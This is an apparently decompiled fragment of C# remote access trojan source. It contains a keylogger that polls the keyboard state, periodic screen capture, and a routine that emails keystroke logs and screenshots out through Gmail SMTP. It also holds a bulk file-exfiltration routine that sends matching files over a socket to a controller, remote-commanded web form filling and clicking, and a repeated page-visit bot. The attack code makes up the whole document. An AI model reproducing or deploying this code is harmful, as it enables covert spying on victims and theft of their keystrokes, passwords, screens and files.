			string text = checked(msg.Length + 6 + 10).ToString();
			text = text.PadLeft(10, '0');
			string s = text + "{****}";
			byte[] array = Encoding.ASCII.GetBytes(s).Concat(msg).ToArray();
			client.BeginSend(array, 0, array.Length, SocketFlags.None, OnSend, client);
			isConnected = true;
			GC.Collect();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void OnSend(IAsyncResult ar)
	{
		try
		{
			Socket socket = (Socket)ar.AsyncState;
			socket.EndSend(ar);
			isConnected = true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			isConnected = false;
			ProjectData.ClearProjectError();
		}
	}

	private void ViewB0tBg_DoWork(object sender, DoWorkEventArgs e)
	{
		int num = 0;
		string text = Md5FromString(linkToVisit);
		try
		{
			num = Convert.ToInt32(((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			num = 0;
			ProjectData.ClearProjectError();
		}
		checked
		{
			while (num < totalTimesToVisit)
			{
				disableWbBrowserEmailonLoad = true;
				if (!ViewB0tBg.CancellationPending)
				{
					WebBrowser1.Navigate(linkToVisit);
					num++;
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text, num.ToString(), false);
					Thread.Sleep(1000 * durationOfVisit);
					disableWbBrowserEmailonLoad = true;
					if (!ViewB0tBg.CancellationPending)
					{
						WebBrowser1.Navigate("about:blank");
						Thread.Sleep(1000 * delayBetweenVisits);
						continue;
					}
					e.Cancel = true;
					break;
				}
				e.Cancel = true;
				break;
			}
			disableWbBrowserEmailonLoad = false;
		}
	}

	public string Md5FromString(string Source)
	{
		StringBuilder stringBuilder = new StringBuilder();
		if (string.IsNullOrEmpty(Source))
		{
			throw new ArgumentNullException();
		}
		byte[] bytes = Encoding.Default.GetBytes(Source);
		bytes = MD5.Create().ComputeHash(bytes);
		checked
		{
			int num = bytes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				stringBuilder.Append(bytes[num2].ToString("x2"));
				num2++;
			}
			return stringBuilder.ToString();
		}
	}

	private void webBrowserInvoke(string cmd)
	{
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Expected O, but got Unknown
		//IL_01a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01af: Expected O, but got Unknown
		//IL_0252: Unknown result type (might be due to invalid IL or missing references)
		//IL_0259: Expected O, but got Unknown
		//IL_0347: Unknown result type (might be due to invalid IL or missing references)
		//IL_034e: Expected O, but got Unknown
		//IL_03f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f7: Expected O, but got Unknown
		string[] array = cmd.Split(new char[1] { '|' });
		checked
		{
			try
			{
				int num = array.Length;
				int num2 = 0;
				IEnumerator enumerator = default(IEnumerator);
				IEnumerator enumerator2 = default(IEnumerator);
				IEnumerator enumerator3 = default(IEnumerator);
				IEnumerator enumerator4 = default(IEnumerator);
				IEnumerator enumerator5 = default(IEnumerator);
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 > num4)
					{
						break;
					}
					if (Operators.CompareString(array[num2], "E", false) == 0)
					{
						try
						{
							HtmlElement val = WebBrowser1.get_Document().get_All().get_Item(array[num2 + 1]);
							val.Focus();
							val.set_InnerText(array[num2 + 2]);
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					else if (Operators.CompareString(array[num2], "e", false) == 0)
					{
						try
						{
							try
							{
								enumerator = WebBrowser1.get_Document().get_All().GetEnumerator();
								while (enumerator.MoveNext())
								{
									HtmlElement val2 = (HtmlElement)enumerator.Current;
									if (Strings.InStr(val2.get_Name(), array[num2 + 1], (CompareMethod)0) != 0)
									{
										val2.Focus();
										val2.set_InnerText(array[num2 + 2]);
									}
								}
							}
							finally
							{
								if (enumerator is IDisposable)
								{
									(enumerator as IDisposable).Dispose();
								}
							}
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
					else if (Operators.CompareString(array[num2], "C", false) == 0)
					{
						try
						{
							WebBrowser1.get_Document().GetElementById(array[num2 + 1]).InvokeMember("click");
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
					}
					else if (Operators.CompareString(array[num2], "c", false) == 0)
					{
						try
						{
							try
							{
								enumerator2 = WebBrowser1.get_Document().get_All().GetEnumerator();
								while (enumerator2.MoveNext())
								{
									HtmlElement val3 = (HtmlElement)enumerator2.Current;
									if (Strings.InStr(val3.get_Name(), array[num2 + 1], (CompareMethod)0) != 0)
									{
										val3.Focus();
										val3.InvokeMember("click");
									}
								}
							}
							finally
							{
								if (enumerator2 is IDisposable)
								{
									(enumerator2 as IDisposable).Dispose();
								}
							}
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
					}
					else if (Operators.CompareString(array[num2], "D", false) == 0)
					{
						try
						{
							HtmlElementCollection all = WebBrowser1.get_Document().get_All();
							try
							{
								enumerator3 = all.GetEnumerator();
								while (enumerator3.MoveNext())
								{
									HtmlElement val4 = (HtmlElement)enumerator3.Current;
									if (Operators.CompareString(val4.GetAttribute("value"), array[num2 + 1], false) == 0)
									{
										val4.InvokeMember("click");
										break;
									}
								}
							}
							finally
							{
								if (enumerator3 is IDisposable)
								{
									(enumerator3 as IDisposable).Dispose();
								}
							}
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
					}
					else if (Operators.CompareString(array[num2], "M", false) == 0)
					{
						try
						{
							WebBrowser1.get_Document().GetElementById(array[num2 + 1]).SetAttribute("value", array[num2 + 2]);
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
					}
					else if (Operators.CompareString(array[num2], "m", false) == 0)
					{
						try
						{
							try
							{
								enumerator4 = WebBrowser1.get_Document().get_All().GetEnumerator();
								while (enumerator4.MoveNext())
								{
									HtmlElement val5 = (HtmlElement)enumerator4.Current;
									if (Strings.InStr(val5.get_Name(), array[num2 + 1], (CompareMethod)0) != 0)
									{
										val5.SetAttribute("value", array[num2 + 2]);
									}
								}
							}
							finally
							{
								if (enumerator4 is IDisposable)
								{
									(enumerator4 as IDisposable).Dispose();
								}
							}
						}
						catch (Exception projectError7)
						{
							ProjectData.SetProjectError(projectError7);
							ProjectData.ClearProjectError();
						}
					}
					else if (Operators.CompareString(array[num2], "t", false) == 0)
					{
						try
						{
							try
							{
								enumerator5 = WebBrowser1.get_Document().GetElementsByTagName(array[num2 + 1]).GetEnumerator();
								while (enumerator5.MoveNext())
								{
									HtmlElement val6 = (HtmlElement)enumerator5.Current;
									if (val6.get_OuterHtml().Contains(array[num2 + 2]))
									{
										val6.InvokeMember("click");
									}
								}
							}
							finally
							{
								if (enumerator5 is IDisposable)
								{
									(enumerator5 as IDisposable).Dispose();
								}
							}
						}
						catch (Exception projectError8)
						{
							ProjectData.SetProjectError(projectError8);
							ProjectData.ClearProjectError();
						}
					}
					else if (Operators.CompareString(array[num2], "r", false) != 0 && Operators.CompareString(array[num2], "f", false) == 0)
					{
					}
					num2 += 3;
				}
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void KLTimer_Tick(object sender, EventArgs e)
	{
		checked
		{
			if (KLTextBox.get_Text().EndsWith("aaaa"))
			{
				KLTextBox.set_Text(KLTextBox.get_Text().Substring(0, KLTextBox.get_Text().Length - 1));
			}
			if (KLTextBox.get_Text().EndsWith("ssss"))
			{
				KLTextBox.set_Text(KLTextBox.get_Text().Substring(0, KLTextBox.get_Text().Length - 1));
			}
			if (KLTextBox.get_Text().EndsWith("dddd"))
			{
				KLTextBox.set_Text(KLTextBox.get_Text().Substring(0, KLTextBox.get_Text().Length - 1));
			}
			if (KLTextBox.get_Text().EndsWith("wwww"))
			{
				KLTextBox.set_Text(KLTextBox.get_Text().Substring(0, KLTextBox.get_Text().Length - 1));
			}
			int num = 32767;
			int num2 = 0;
			int num3 = 0;
			do
			{
				num2 = 0;
				num2 = GetAsyncKeyState(num3);
				int num4 = num3;
				if (num2 == -num)
				{
					if (GetAsyncKeyState(13L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + Environment.NewLine);
					}
					else if (GetAsyncKeyState(44L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "[REQUEST SCREENSHOT]");
					}
					else if (GetAsyncKeyState(45L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "[INS]");
					}
					else if (GetAsyncKeyState(44L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "[REQUEST SCREENSHOT]");
					}
					else if (GetAsyncKeyState(47L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "[HELP]");
					}
					else if (GetAsyncKeyState(95L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "[SLEEP]");
					}
					else if (GetAsyncKeyState(106L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "[MULTIPLY]");
					}
					else if (GetAsyncKeyState(107L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "[ADD]");
					}
					else if (GetAsyncKeyState(108L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "[SEPARATOR]");
					}
					else if (GetAsyncKeyState(109L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "[SUBTRACT]");
					}
					else if (GetAsyncKeyState(110L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "[DECIMAL]");
					}
					else if (GetAsyncKeyState(111L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "[DIVIDE]");
					}
					else if (GetAsyncKeyState(110L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "[DECIMAL]");
					}
					else if (GetAsyncKeyState(8L) != 0)
					{
						if (!KLTextBox.get_Text().EndsWith("[B][B][B][B][B][B][B][B][B][B]"))
						{
							KLTextBox.set_Text(KLTextBox.get_Text() + "[B]");
						}
						else
						{
							KLTextBox.set_Text(KLTextBox.get_Text().Substring(0, KLTextBox.get_Text().Length - 30));
							KLTextBox.set_Text(KLTextBox.get_Text() + "[BACK*10]");
						}
					}
					else if ((GetAsyncKeyState(18L) & GetAsyncKeyState(9L)) != 0)
					{
						if (!KLTextBox.get_Text().EndsWith("[ALT/TAB]"))
						{
							KLTextBox.set_Text(KLTextBox.get_Text() + "[ALT/TAB]");
						}
					}
					else if ((GetAsyncKeyState(162L) | GetAsyncKeyState(163L)) != 0)
					{
						if (!KLTextBox.get_Text().EndsWith("[CTRL]"))
						{
							KLTextBox.set_Text(KLTextBox.get_Text() + "[CTRL]");
						}
					}
					else if (GetAsyncKeyState(20L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "");
					}
					else if (GetAsyncKeyState(27L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "[ESC]");
					}
					else if (GetAsyncKeyState(46L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "[DEL]");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(49L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "!");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(50L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "@");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(51L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "#");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(52L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "$");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(53L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "%");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(54L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "^");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(55L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "&");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(56L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "*");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(57L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "(");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(48L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + ")");
					}
					else if (GetAsyncKeyState(37L) != 0)
					{
						if (!KLTextBox.get_Text().EndsWith("[<-]"))
						{
							KLTextBox.set_Text(KLTextBox.get_Text() + "[<-]");
						}
					}
					else if (GetAsyncKeyState(38L) != 0)
					{
						if (!KLTextBox.get_Text().EndsWith("[UP]"))
						{
							KLTextBox.set_Text(KLTextBox.get_Text() + "[UP]");
						}
					}
					else if (GetAsyncKeyState(39L) != 0)
					{
						if (!KLTextBox.get_Text().EndsWith("[->]"))
						{
							KLTextBox.set_Text(KLTextBox.get_Text() + "[->]");
						}
					}
					else if (GetAsyncKeyState(40L) != 0)
					{
						if (!KLTextBox.get_Text().EndsWith("[DOWN]"))
						{
							KLTextBox.set_Text(KLTextBox.get_Text() + "[DOWN]");
						}
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(187L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "+");
					}
					else if (GetAsyncKeyState(187L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "=");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(188L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "<");
					}
					else if (GetAsyncKeyState(188L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + ",");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(189L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "_");
					}
					else if (GetAsyncKeyState(189L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "-");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(190L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + ">");
					}
					else if (GetAsyncKeyState(190L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + ".");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(191L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "?");
					}
					else if (GetAsyncKeyState(191L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "/");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(219L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "{");
					}
					else if (GetAsyncKeyState(219L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "[");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(220L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "|");
					}
					else if (GetAsyncKeyState(220L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "\\");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(221L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "}");
					}
					else if (GetAsyncKeyState(221L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "]");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(222L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "\"");
					}
					else if (GetAsyncKeyState(222L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "'");
					}
					else if (((GetAsyncKeyState(160L) | GetAsyncKeyState(161L)) & GetAsyncKeyState(186L)) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + ":");
					}
					else if (GetAsyncKeyState(186L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + ";");
					}
					else if (GetAsyncKeyState(99L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "3");
					}
					else if (GetAsyncKeyState(100L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "4");
					}
					else if (GetAsyncKeyState(101L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "5");
					}
					else if (GetAsyncKeyState(102L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "6");
					}
					else if (GetAsyncKeyState(103L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "7");
					}
					else if (GetAsyncKeyState(104L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "8");
					}
					else if (GetAsyncKeyState(105L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "9");
					}
					else if (GetAsyncKeyState(98L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "2");
					}
					else if (GetAsyncKeyState(97L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "1");
					}
					else if (GetAsyncKeyState(96L) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + "0");
					}
					else if (((short)unchecked(-(short)(0 - (((((GetAsyncKeyState(1L) == 0) & (GetAsyncKeyState(2L) == 0) & (GetAsyncKeyState(164L) == 0) & (GetAsyncKeyState(165L) == 0)) ? 1 : 0) < (false ? 1 : 0)) ? 1 : 0))) & (GetAsyncKeyState(160L) | GetAsyncKeyState(161L) | (short)unchecked(-(short)(0 - (((Control.IsKeyLocked((Keys)20) ? 1 : 0) < (false ? 1 : 0)) ? 1 : 0))))) != 0)
					{
						KLTextBox.set_Text(KLTextBox.get_Text() + Convert.ToString(Strings.UCase(Strings.Chr(num4))));
					}
					else if ((GetAsyncKeyState(1L) == 0) & (GetAsyncKeyState(2L) == 0) & (GetAsyncKeyState(164L) == 0) & (GetAsyncKeyState(165L) == 0))
					{
						if ((GetAsyncKeyState(160L) | GetAsyncKeyState(161L) | unchecked((short)(0u - ((GetKeyState(20) == 1) ? 1u : 0u)))) != 0)
						{
							if (num4 != 16)
							{
								KLTextBox.set_Text(KLTextBox.get_Text() + Convert.ToString(Strings.UCase(Strings.Chr(num4))));
							}
							else if (!KLTextBox.get_Text().EndsWith("[SHIFT]"))
							{
								KLTextBox.set_Text(KLTextBox.get_Text() + "[SHIFT]");
							}
						}
						else
						{
							KLTextBox.set_Text(KLTextBox.get_Text() + Convert.ToString(Strings.LCase(Strings.Chr(num4))));
						}
					}
				}
				num3++;
			}
			while (num3 <= 4094);
		}
	}

	private void mailWorker_DoWork(object sender, DoWorkEventArgs e)
	{
		MailMessage mailMessage = new MailMessage();
		checked
		{
			try
			{
				mailMessage.To.Add(IUNAME + "@gmail.com");
				mailMessage.From = new MailAddress(IUNAME + "@gmail.com");
				mailMessage.Subject = "[" + downloadSource + "]V" + Convert.ToString(KLAppVersion_new) + "[ID:" + Convert.ToString(mIDRegValue) + "]) - " + ((ServerComputer)MyProject.Computer).get_Name() + "(" + Convert.ToString(mIDRegValue) + ")";
				mailMessage.IsBodyHtml = true;
				string text = "smtp.gmail.com";
				SmtpClient smtpClient = new SmtpClient(text);
				smtpClient.EnableSsl = true;
				smtpClient.Port = Convert.ToInt32(text[5]) + 484;
				smtpClient.Credentials = new NetworkCredential(IUNAME + "@gmail.com", IPWORD);
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\we" + Convert.ToString(globalImNumber) + ".png"))
				{
					Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\we" + Convert.ToString(globalImNumber) + ".png");
					mailMessage.Attachments.Add(item);
				}
				mailMessage.Body = "[EMPTY]";
				mailMessage.Body = KLTextBox.get_Text();
				smtpClient.Send(mailMessage);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			finally
			{
				mailMessage.Dispose();
				KLTextBox.set_Text("");
				try
				{
					int num = 0;
					do
					{
						if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\weu" + Convert.ToString(num) + ".png"))
						{
							File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\weu" + Convert.ToString(num) + ".png");
						}
						num++;
					}
					while (num <= 9);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				try
				{
					int num2 = 0;
					do
					{
						if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\we" + Convert.ToString(num2) + ".png"))
						{
							File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\we" + Convert.ToString(num2) + ".png");
						}
						num2++;
					}
					while (num2 <= 9);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private void ScreenCaptureTimer_Tick(object sender, EventArgs e)
	{
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0129: Unknown result type (might be due to invalid IL or missing references)
		//IL_0130: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014c: Expected O, but got Unknown
		//IL_0157: Unknown result type (might be due to invalid IL or missing references)
		//IL_015e: Expected O, but got Unknown
		try
		{
			Size size = new Size(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
			Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			Graphics.FromImage((Image)(object)val).CopyFromScreen(point, point2, size);
			int num = 0;
			do
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\weu" + Convert.ToString(num) + ".png"))
				{
					num = checked(num + 1);
					continue;
				}
				((Image)val).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\weu" + Convert.ToString(num) + ".png");
				globalImNumber = num;
				break;
			}
			while (num <= 9);
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\weu" + Convert.ToString(globalImNumber) + ".png"))
			{
				Bitmap val2 = new Bitmap(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\weu" + Convert.ToString(globalImNumber) + ".png");
				ImageCodecInfo encoder = GetEncoder(ImageFormat.get_Jpeg());
				Encoder quality = Encoder.Quality;
				EncoderParameters val3 = new EncoderParameters(1);
				EncoderParameter val4 = new EncoderParameter(quality, 35L);
				val3.get_Param()[0] = val4;
				((Image)val2).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\we" + Convert.ToString(globalImNumber) + ".png", encoder, val3);
				((Image)val2).Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (!mailWorker.IsBusy)
		{
			mailWorker.RunWorkerAsync();
		}
	}

	private ImageCodecInfo GetEncoder(ImageFormat format)
	{
		ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
		ImageCodecInfo[] array = imageDecoders;
		int num = 0;
		ImageCodecInfo val;
		while (true)
		{
			if (num < array.Length)
			{
				val = array[num];
				if (val.get_FormatID() == format.get_Guid())
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			return null;
		}
		return val;
	}

	private void MultipleFileTransferBg_DoWork(object sender, DoWorkEventArgs e)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(MFT_directoryName);
		FileInfo[] files = directoryInfo.GetFiles();
		FileInfo[] array = files;
		checked
		{
			foreach (FileInfo fileInfo in array)
			{
				if (!(fileInfo.Extension.ToLower().Equals(MFT_fileExtension.ToLower()) & (fileInfo.Length < Conversions.ToLong(MFT_fileSize) * 1024L * 1024L)))
				{
					continue;
				}
				try
				{
					MFT_okToContinue = false;
					FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.Open);
					BinaryReader binaryReader = new BinaryReader(fileStream);
					byte[] second = binaryReader.ReadBytes((int)fileStream.Length);
					string s = "Multiple File Transfer" + ACK;
					byte[] bytes = Encoding.ASCII.GetBytes(s);
					int num = bytes.Concat(Encoding.ASCII.GetBytes(fileInfo.get_Name())).Concat(Encoding.ASCII.GetBytes("{****}")).ToArray()
						.ToArray()
						.Concat(second)
						.ToArray()
						.Concat(Encoding.ASCII.GetBytes("{****}"))
						.ToArray()
						.Length;
					byte[] array2 = new byte[num + 1];
					array2 = bytes.Concat(Encoding.ASCII.GetBytes(fileInfo.get_Name())).Concat(Encoding.ASCII.GetBytes("{****}")).ToArray()
						.ToArray()
						.Concat(second)
						.ToArray()
						.Concat(Encoding.ASCII.GetBytes("{****}"))
						.ToArray();
					binaryReader.Close();
					fileStream.Close();
					SendBytes(array2, clientSocket);
					second = null;
					bytes = null;
					MFT_maxNumberFiles = Conversions.ToString(Conversions.ToDouble(MFT_maxNumberFiles) - 1.0);
					if (Conversions.ToDouble(MFT_maxNumberFiles) == 0.0)
					{
						break;
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					Send("Multiple File Transfer" + ACK + ex2.Message + "{****}", clientSocket);
					ProjectData.ClearProjectError();
				}
				while (!MFT_okToContinue)
				{
					Thread.Sleep(5000);
				}
			}
		}
	}
}
